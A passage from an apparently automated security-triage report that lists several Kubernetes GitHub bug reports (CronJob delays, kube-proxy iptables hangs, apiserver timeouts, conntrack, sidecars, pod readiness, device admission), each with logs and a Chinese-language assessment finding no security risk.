#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经分析，该Issue描述了在使用DaemonSet进行滚动升级时，出现了升级卡住的问题，具体表现为某个Pod未能更新，以及DaemonSet在删除异常Pod时，每隔几分钟才删除一个Pod。该问题可能与DaemonSet的控制逻辑或调度策略有关，属于功能性故障。

根据风险判断标准：

1. **该风险能被攻击者利用**：该问题是正常的功能性缺陷，没有迹象表明攻击者可以利用此问题进行攻击。

2. **该风险有可能成为一个漏洞**：该问题不会导致系统的安全漏洞，不会被分配CVE编号，且根据CVSS 3.1评分标准，此问题不涉及安全风险评分。

6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：此Issue不涉及安全问题。

综上所述，该Issue不涉及安全风险。

---

## Issue #128881 Cronjobs occasionally run much later than scheduled

- Issue 链接：[#128881](https://github.com/kubernetes/kubernetes/issues/128881)

### Issue 内容

#### What happened?

CronJobs will occasionally fail to create their Jobs at the scheduled time, with delays ranging from 3 minutes to over 50 minutes. In the most extreme cases we've observed delays over 60 minutes. 

From the kube-controller-manager logs, if I'm understanding correctly (which i may not), it appears that CronJobs rely exclusively on the reconciliation process to trigger Job creation. If no reconciliation occurs around the scheduled time, the Job is not created until a subsequent reconciliation cycle is triggered.

Logs consistently show the following pattern (verbosity set to 8), even for CronJobs that execute on time, this job ran 5 minutes later than scheduled:
```console
I1120 11:05:32.562672       1 cronjob_controllerv2.go:526] "No unmet start times" logger="cronjob-controller" cronjob="camel-test/mkt-cloud-segments-servicecloud-v2-simu-buidar-pp" 
I1120 11:05:32.562702       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" logger="cronjob-controller" cronjob="camel-test/mkt-cloud-segments-servicecloud-v2-simu-buidar-pp" requeueAfter="23h54m27.538988861s"
```
Ocasionally this pattern can also be observed in the kube-controller-manager logs:
```console
E1120 13:33:05.831607       1 cronjob_controllerv2.go:168] error syncing CronJobController golang/datafeeds-download-datafeeds, requeuing: Operation cannot be fulfilled on cronjobs.batch "datafeeds-download-datafeeds": the object has been modified; please apply your changes to the latest version and try again
```

Performing manual actions, such as editing the CronJob object or deleting an old Job, forces an immediate reconciliation and triggers the creation of the pending Job.

Another thing we observed is that the issue only affects cronjobs that run on a daily basis (these are distributed at different times) but those that run frequently, like every 15 minutes, never get delayed.

Things we checked:
1. Control-plane clocks verified: All clocks are synchronized using NTP. No drift observed.
2. Increased logging verbosity: Enabled v=8 for kube-controller-manager
3. The number of cronjobs does not seem to be too much for the size of the cluster and resource utilization

We don't know what could be causing this behavior and we don't know how to continue debugging it further.

#### What did you expect to happen?

CronJobs should create their corresponding Jobs at the scheduled time.

#### How can we reproduce it (as minimally and precisely as possible)?

These are the details of the basic current cluster configuration, however I do not know if the issue could be replicated in another similar cluster.

- Cluster Size: 8 worker nodes, 3 control-plane nodes
- CronJob API Version: batch/v1
- Number of CronJobs: ~100 scheduled at various intervals, distributed in multiple namespaces

Resource Utilization:
- Control-plane nodes have sufficient CPU and memory resources (not near limits).
- The kube-controller-manager pod does not have resource limits set.

#### Anything else we need to know?

Keda operator is installed and we have 3 deployments that are managed by Keda, logs regarding these objects are frequent:
```console
11:46:17.755947 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=0 metric="external metric s0-cron-Europe-Madrid-07xx1-5-021xx1-5(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-activemq-dev,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:17 +0100 CET" scaleTarget="Deployment/activemq-test/activemq-dev"
11:46:17.760043 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=1 metric="external metric s0-cron-Europe-Madrid-0000xxx-5523xxx(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-integracions-erpex,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:17 +0100 CET" scaleTarget="Deployment/camel/integracions-erpex"
11:46:31.385874 graph_builder.go:681] "GraphBuilder process object" logger="garbage-collector-controller" apiVersion="keda.sh/v1alpha1" kind="ScaledObject" object="camel/cron-integracions-erpex" uid="d9d7f22a-0eef-4c21-8c23-7823fc6e1f60" eventType="update" virtual=false
11:46:31.900165 graph_builder.go:681] "GraphBuilder process object" logger="garbage-collector-controller" apiVersion="keda.sh/v1alpha1" kind="ScaledObject" object="activemq-test/cron-activemq-dev" uid="eef2ed20-c9ef-40a2-bee4-3c0fcc71dd5a" eventType="update" virtual=false
11:46:32.782034 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=0 metric="external metric s0-cron-Europe-Madrid-07xx1-5-021xx1-5(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-activemq-dev,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:32 +0100 CET" scaleTarget="Deployment/activemq-test/activemq-dev"
11:46:32.787861 horizontal.go:841] "Proposing desired replicas" logger="horizontal-pod-autoscaler-controller" desiredReplicas=1 metric="external metric s0-cron-Europe-Madrid-0000xxx-5523xxx(&LabelSelector{MatchLabels:map[string[]string{scaledobject.keda.sh/name: cron-integracions-erpex,},MatchExpressions:[]LabelSelectorRequirement{},})" timestamp="2024-11-19 11:46:32 +0100 CET" scaleTarget="Deployment/camel/integracions-erpex"
```

There is a custom operator that observes events on several custom resources.

We've observed this issue through multiple kubernetes versions, no upgrade has fixed it.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.6
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.6
```
</details>


#### Cloud provider

<details>
On premise
</details>


#### OS version

<details>

```console
# On Linux:
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux k8scp02 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.7.12-0ubuntu2~22.04.1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
vwmare-csi v3.3.1

cilium v1.16.1
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue主要描述了在Kubernetes集群中，CronJob偶尔无法按计划时间创建对应的Job，存在延迟现象。通过日志和排查，问题可能与CronJob控制器的协调过程、集群资源以及第三方组件（如Keda operator、自定义operator）等因素有关。这是一个集群调度和运维方面的问题。

根据风险判断标准：

1. 该问题属于CronJob调度延迟的运维问题，未涉及攻击者可利用的安全风险。
2. 没有迹象表明该问题可能成为一个漏洞，且不会被分配CVE编号。
3. Issue内容未暴露敏感信息或存在不当操作。
4. 不涉及拒绝服务攻击的高风险情况，且攻击者无法通过该问题进行任何形式的攻击或造成更大的影响。
5. 日志中没有泄露凭据的风险。
6. 因此，风险评级判断为不涉及安全风险。

---

## Issue #128879 kube-proxy failed to sync iptables rules due to iptables-restore command don't exit 

- Issue 链接：[#128879](https://github.com/kubernetes/kubernetes/issues/128879)

### Issue 内容

#### What happened?

kube-proxy can't update iptables rule. found `iptables-restore` command has been executed for a long time(5h-44m-21s).
 
![iptables-restore-time](https://github.com/user-attachments/assets/491cddbc-56d5-4a8b-8be6-0d9c39fc1321)

the process of execute `iptables-restore` belong to kube-proxy

![kube-proxy](https://github.com/user-attachments/assets/4801defb-b802-4ba5-8d91-36d5532f73b1)

the `iptables-restore` command execution did not exit without timeout, blocking the [iptables rule synchronization cronjob](https://github.com/kubernetes/kubernetes/blob/master/pkg/proxy/iptables/proxier.go#L328)

kube-proxy log as below
```
Nov 20 15:23:50 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:23:21.690443 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 26009: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-FUMX47BPHPPPKNON\nline 26010: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-ODGMTJMGUEVYWKRC\n)"
Nov 20 15:23:51 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:23:51.788488 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 25997: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-EUVQAHLVXQN6K7TX\nline 25998: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-2YZVDXPRKK52I4WI\n)"
Nov 20 15:24:51 ml-gpu-ser429.nmg01 kube-proxy[3634364]: E1120 15:24:51.930534 3634364 proxier.go:1615] "Failed to execute iptables-restore" err="exit status 4 (iptables-restore v1.8.4 (nf_tables): \nline 25989: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-6DERLMNL53J5PFHZ\nline 25990: CHAIN_USER_DEL failed (Device or resource busy): chain KUBE-SEP-CIEL22EO752PNBPK\n)"
```

aslo found a lot of duplicates ipatable rules
![duplicate-rules](https://github.com/user-attachments/assets/88609f60-e18d-443a-a028-3fbcce915d5a)


#### What did you expect to happen?

the `iptables-restore` command execute with timeout

#### How can we reproduce it (as minimally and precisely as possible)?

install v1.21.6 kubernetes(with kube-proxy)，and v1.8.4 iptables 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"21+", GitVersion:"v1.21.6-mlpe-20211119", GitCommit:"bebe216b204e80bebf57c1992e61e1857ff2a86d", GitTreeState:"clean", BuildDate:"2021-11-19T10:08:58Z", GoVersion:"go1.16.9", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"21+", GitVersion:"v1.21.6-mlpe-20211119", GitCommit:"bebe216b204e80bebf57c1992e61e1857ff2a86d", GitTreeState:"clean", BuildDate:"2024-10-24T03:10:00Z", GoVersion:"go1.16.3", Compiler:"gc", Platform:"linux/amd64"}
```
we developed based on version 1.21.6, but without modifying the kube-proxy code.
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:

$ cat /etc/os-release
# CentOS Linux release 8.2.2004 (Core) 

$ uname -a
# Linux ml-gpu-ser611.nmg01 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

$ iptables -v
# iptables v1.8.4 (nf_tables): no command specified

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了kube-proxy无法更新iptables规则，原因是`iptables-restore`命令长时间未退出，导致iptables规则同步被阻塞。从提供的日志和描述来看，这是由于`iptables-restore`命令在执行中出现问题，可能是系统或软件的BUG。根据风险判断标准，此问题未涉及攻击者可利用的安全漏洞，也未涉及命令执行、容器逃逸、提权等高安全风险的问题。因此，该Issue不涉及安全风险。

---

## Issue #128863 apiserver timeouts and random shutdown

- Issue 链接：[#128863](https://github.com/kubernetes/kubernetes/issues/128863)

### Issue 内容

#### What happened?

I'm running a k8s cluster using `kind`. Currently, there are ~3k agents connected. But in my tests, I frequently see connection timeouts, or connection reset messages from the `apiserver`. Example:
```
❯ kubectl get pods
Get "https://REDACTED:6443/api/v1/namespaces/default/pods?limit=500": net/http: TLS handshake timeout - error from a previous attempt: read tcp 10.219.21.215:58434->10.219.21.215:6443: read: connection reset by peer
```

Another issue is that the apiserver seems to shutdown without any obvious error message. Here are the logs from apiserver captured when I saw the 'connection reset' error, also indicates apiserver shutdown:
```
E1119 13:37:45.788062       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.788243       1 finisher.go:175] "Unhandled Error" err="FinishRequest: post-timeout activity - time-elapsed: 156.135µs, panicked: false, err: context canceled, panic-reason: <nil>" logger="UnhandledError"
E1119 13:37:45.789372       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.791612       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:45.792698       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="4.6593ms" method="POST" path="/api/v1/namespaces/default/events" result=null
E1119 13:37:49.739514       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.739573       1 finisher.go:175] "Unhandled Error" err="FinishRequest: post-timeout activity - time-elapsed: 24.511µs, panicked: false, err: context canceled, panic-reason: <nil>" logger="UnhandledError"
E1119 13:37:49.739805       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"context canceled\"}: context canceled" logger="UnhandledError"
E1119 13:37:49.740573       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.740921       1 writers.go:122] "Unhandled Error" err="apiserver was unable to write a JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.741688       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.741964       1 status.go:71] "Unhandled Error" err="apiserver received an error that is not an metav1.Status: &errors.errorString{s:\"http: Handler timeout\"}: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.742969       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="3.77214ms" method="PATCH" path="/api/v1/namespaces/default/events/58a19fee-2f57-4f96-a4f6-0e70fba87637.1809622ae123cfd8" result=null
E1119 13:37:49.743003       1 writers.go:135] "Unhandled Error" err="apiserver was unable to write a fallback JSON response: http: Handler timeout" logger="UnhandledError"
E1119 13:37:49.744130       1 timeout.go:140] "Post-timeout activity" logger="UnhandledError" timeElapsed="4.933539ms" method="GET" path="/api/v1/nodes/58a19fee-2f57-4f96-a4f6-0e70fba87637" result=null
E1119 13:39:54.379155       1 compact.go:124] etcd: endpoint ([https://127.0.0.1:2379]) compact failed: etcdserver: mvcc: required revision has been compacted
I1119 13:40:03.367380       1 controller.go:128] Shutting down kubernetes service endpoint reconciler
W1119 13:40:03.391092       1 lease.go:265] Resetting endpoints for master service "kubernetes" to []
I1119 13:40:03.411543       1 controller.go:86] Shutting down OpenAPI V3 AggregationController
I1119 13:40:03.411720       1 cluster_authentication_trust_controller.go:466] Shutting down cluster_authentication_trust_controller controller
I1119 13:40:03.411735       1 storage_flowcontrol.go:187] APF bootstrap ensurer is exiting
I1119 13:40:03.412052       1 available_controller.go:440] Shutting down AvailableConditionController
I1119 13:40:03.412063       1 controller.go:132] Ending legacy_token_tracking_controller
I1119 13:40:03.412067       1 controller.go:133] Shutting down legacy_token_tracking_controller
I1119 13:40:03.412075       1 system_namespaces_controller.go:76] Shutting down system namespaces controller
I1119 13:40:03.412082       1 autoregister_controller.go:168] Shutting down autoregister controller
I1119 13:40:03.412094       1 gc_controller.go:91] Shutting down apiserver lease garbage collector
I1119 13:40:03.412101       1 apf_controller.go:389] Shutting down API Priority and Fairness config worker
```

#### What did you expect to happen?

apiserver shouldn't shutdown, and should work without timeout or connection-reset messages.

#### How can we reproduce it (as minimally and precisely as possible)?

I don't have a minimal reproducer right now. I can describe my set-up in detail, if required.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
❯ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Not using Cloud
</details>


#### OS version

<details>

```console
# On Linux:
❯ cat /etc/os-release
NAME="Red Hat Enterprise Linux"
VERSION="8.10 (Ootpa)"
ID="rhel"
ID_LIKE="fedora"
VERSION_ID="8.10"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Red Hat Enterprise Linux 8.10 (Ootpa)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:redhat:enterprise_linux:8::baseos"
HOME_URL="https://www.redhat.com/"
DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8"
BUG_REPORT_URL="https://issues.redhat.com/"

REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 8"
REDHAT_BUGZILLA_PRODUCT_VERSION=8.10
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="8.10"

❯ uname -a
Linux born22.toa.des.co 4.18.0-553.22.1.el8_10.x86_64 #1 SMP Wed Sep 11 18:02:00 EDT 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在使用`kind`运行的k8s集群中，连接了约3000个agent，在测试中频繁遇到连接超时或连接重置的情况，apiserver也会随机地关闭。然而，从描述和日志中，并未体现出存在安全风险的迹象。问题更像是由于高负载下的性能问题，导致apiserver无法处理大量请求，从而引发超时和意外关闭。这是一种稳定性和性能优化的问题，而非安全漏洞。根据风险判断标准，第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。因此，该Issue不涉及安全风险。

---

## Issue #128830 UDP conntrack not cleared when upgrading destination node 

- Issue 链接：[#128830](https://github.com/kubernetes/kubernetes/issues/128830)

### Issue 内容

#### What happened?

In GKE on Kubernetes `1.30.5-gke.1014001`, when having  UDP stream flow from a Pod on one node to a Pod on another node, if the destination node is upgraded (using GKE's normal node pool upgrade process), then sometimes (about 1 in every 3 tests I've performed), the conntrack entry is not cleared, and the UDP stream continues to be sent towards a now dead Pod.

Note: The Service iTP must be set to Cluster.

#### What did you expect to happen?

That the conntrack entry is cleared.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a DaemonSet (on every node) that can receive UDP traffic on every
2. Configured a Service fronting this DaemonSet, with iTP of Cluster
3. Create a "client" pod that sends UDP (non-stop) to one of the destination Pods
4. Figure out which node is receiving the traffic, and perform a GKE upgrade on it
5. Watch traffic to see if it moves to a new node

Repeat steps 3-5 a few times until the problem happens.

#### Anything else we need to know?

So far I can only reproduce on `1.30.5-gke.1014001`, and only when performing a node-pool upgrade (I don't understand this)

I had assumed that https://github.com/kubernetes/kubernetes/pull/127780 would fix it, which landed in 1.30.5, but it didn't seem to help.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.5-gke.1443001
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_CRASH_ID=Lakitu
KERNEL_COMMIT_ID=46944808c635edfd2bc86fd90d924a6def1e28ac
GOOGLE_METRICS_PRODUCT_ID=26
VERSION=113
VERSION_ID=113
BUILD_ID=18244.151.88
$ uname -a
Linux gke-k8s-gcp-qa1-nodes-frontend-us-cen-52fd96a8-ac7u 6.1.100+ #1 SMP PREEMPT_DYNAMIC Sun Sep 29 16:26:42 UTC 2024 x86_64 Intel(R) Xeon(R) CPU @ 2.80GHz GenuineIntel GNU/Linux
```

</details>


#### Install tools

<details>
GKE's 
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

/sig network
cc @aojea 


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在GKE上运行Kubernetes 1.30.5-gke.1014001时，当一个Pod与另一个Pod之间存在UDP流量时，如果目标节点进行升级（使用GKE的正常节点池升级过程），有时连接跟踪（conntrack）条目不会被清除，导致UDP流量继续发送到已经不存在的Pod。

这一问题似乎是由于节点升级过程中，连接跟踪表没有正确更新，导致了流量未能重新路由到新的Pod。然而，这一问题发生在节点升级的过程中，需要具有管理员权限才能执行节点升级操作。

根据风险判断标准：

1. **该风险能被攻击者利用**：普通攻击者无法触发节点升级过程，只有具备管理员权限的人员才能执行此操作。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：该问题并未涉及权限提升、敏感信息泄露、代码执行等高风险安全问题，按照CVSS评分标准，风险等级不会达到high以上。

4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：由于需要管理员权限才能进行节点升级，且影响范围有限，不应判断为高风险。

6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：该Issue主要涉及系统功能性缺陷，而非安全漏洞。

因此，该Issue不涉及安全风险。

---

## Issue #128825 Sidecar Containers for Services are not accessible

- Issue 链接：[#128825](https://github.com/kubernetes/kubernetes/issues/128825)

### Issue 内容

#### What happened?

I'm using a helm chart to deploy an application, and I typically insert an specific proxy I need as a legacy sidecar (after init). However, this helm chart specifically does now allow specifying additional containers (again, legacy sidecar pattern), but it does allow specifying init containers using the newer [Sidecar Containers](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) feature.

The sidecar config might look like this with the new sidecar pattern:
```yaml
      initContainers:
        - name: myproxy
          image: myproxy
          restartPolicy: Always
          ports:
            - containerPort: 8080
              name: proxy-port
              protocol: TCP
```

After deploying this:
- The `v1/Service` has endpoints that point to the target pods
- Manually, I can connect to `<pod IP>:8080`
- Attempting to connect to the service results in a connection refused.

#### What did you expect to happen?

The connection to the sidecar should work.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create a pod with a named port in a container under `initContainers` with `restartPolicy: Always`
- Create a `v1/Service` that has a `selector` that targets the pod
- Attempt to lookup the SRV record

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.5-gke.1443001
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了在Kubernetes中使用`initContainers`作为Sidecar容器的问题。根据Kubernetes的设计，`initContainers`是在主容器之前运行的初始化容器，运行完成后即退出，不会持续运行。因此，将`initContainers`配置为Sidecar容器并期望其提供持续的服务是一个错误的使用方式。

从安全角度来看，这个Issue反映的是一个配置误用问题，并不存在潜在的安全风险。没有提及任何可被攻击者利用的漏洞，也没有涉及敏感信息的泄露或高风险的安全问题。因此，根据风险判断标准，本Issue不涉及安全风险。

---

## Issue #128820 In terminating pod, status of containers is not updated

- Issue 链接：[#128820](https://github.com/kubernetes/kubernetes/issues/128820)

### Issue 内容

#### What happened?

When a pod with several containers is terminating, until all of those containers successfully terminate, the number of ready containers is not updated. For example, if you have a pod with two containers and one of them immediately exits and one of them has a prestop hook that sleeps for several minutes, the pod will show up as 2/2 containers ready even though one container immediately exits.

See kubelet logs here: https://gist.github.com/olyazavr/7f77673a47ce441b3a8670d509de8b16

#### What did you expect to happen?

I expect that the pod status should reflect the number of containers that is actually ready, even if the pod is terminating.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod with two containers, one of which has a prestop hook that sleeps:
```
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  terminationGracePeriodSeconds: 200
  containers:
  - name: test
    command: ["bash", "-c", "sleep infinity"]
  - name: test2
    command: ["bash", "-c", "sleep infinity"]
    lifecycle:
      preStop:
        exec:
          command: ["bash", "-c", "sleep 180"]

```

Delete the pod, and notice that it will stay at 2/2 ready until both containers die even when the runtime acknowledges that one container has been successfully shut down early on

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.10
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.10
```

</details>


#### Cloud provider

<details>
aws
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.3 (Shamrock Pampas Cat)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.3"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.3 (Shamrock Pampas Cat)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.3"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.3"
$ uname -a
Linux ip-172-18-59-83 6.1.109-hs83.el9.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Sep 24 17:33:44 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
crio and containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，当一个包含多个容器的Pod正在终止时，直到所有容器都成功终止，Pod的就绪（Ready）状态不会更新。例如，如果有一个Pod包含两个容器，其中一个容器立即退出，另一个容器有一个需要等待几分钟的preStop hook，Pod仍然会显示为2/2个容器就绪，即使其中一个容器已经退出。

这是一个关于Pod状态显示的不一致性问题，可能会影响运维人员对Pod实际运行状态的判断。然而，根据提供的风险判断标准：

1. **该风险能被攻击者利用**：此问题主要影响状态显示，不涉及攻击者可利用的漏洞。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题不太可能被分配CVE编号，按照CVSS评分，也不满足高风险的条件。
8. **如果Issue可能导致命令执行、容器逃逸、提权等高安全风险的问题，则无论攻击者实施该攻击是否需要权限都应判断为高风险**：此Issue不涉及此类高风险问题。

综上所述，此Issue不涉及安全风险。

---

## Issue #128854 pod requesting zero devices with zero available fails admission for 'Allocate failed due to no healthy devices present'

- Issue 链接：[#128854](https://github.com/kubernetes/kubernetes/issues/128854)

### Issue 内容

#### What happened?

pod create failed

```
status:
  message: 'Pod was rejected: Allocate failed due to no healthy devices present; cannot allocate unhealthy devices      nvidia.com/gpu, which is unexpected'
  phase: Failed
  reason: UnexpectedAdmissionError
  startTime: "2024-11-19T03:04:55z"
```

pod yaml is 

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jktest
spec:
  selector:
    matchLabels:
      workload.es.io: jktest
  template:
    metadata:
      labels:
        workload: jktest
    spec:
      containers:
      - image: centos:latest
        imagePullPolicy: IfNotPresent
        name: test
        resources:
          limits:
            cpu: 250m
            memory: 512Mi
            nvidia.com/gpu: "0"
          requests:
            cpu: 250m
            memory: 512Mi
            nvidia.com/gpu: "0"
```

the node info is

```
...
allocatable: 
  memory: 252717800Ki       
  nvidia.com/gpu: "0"
  pods: "255"
capacity: 
  memory: 263278312Ki 
  nvidia.com/gpu: "0" 
  pods: "255"
```

This failure are very similar to https://github.com/kubernetes/kubernetes/issues/109191 , but the prompts are different.

#### What did you expect to happen?

When the number of `external resource` requests in a pod is `0`, the creation is successful.

#### How can we reproduce it (as minimally and precisely as possible)?

1 create pod a which use hot pluggable device in resource.request, and the resource is 1
2 remove device
3 create pod b which use hot pluggable device in resource.request, and the ressource is 0

#### Anything else we need to know?

I am confident that this issue was introduced by the [pull](https://github.com/kubernetes/kubernetes/pull/114640).

Unable to control the application even when resources are not used, but set to 0, for more information see [issue](https://github.com/kubernetes/kubernetes/issues/109191).

#### Kubernetes version


```console
$ kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.2
```


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
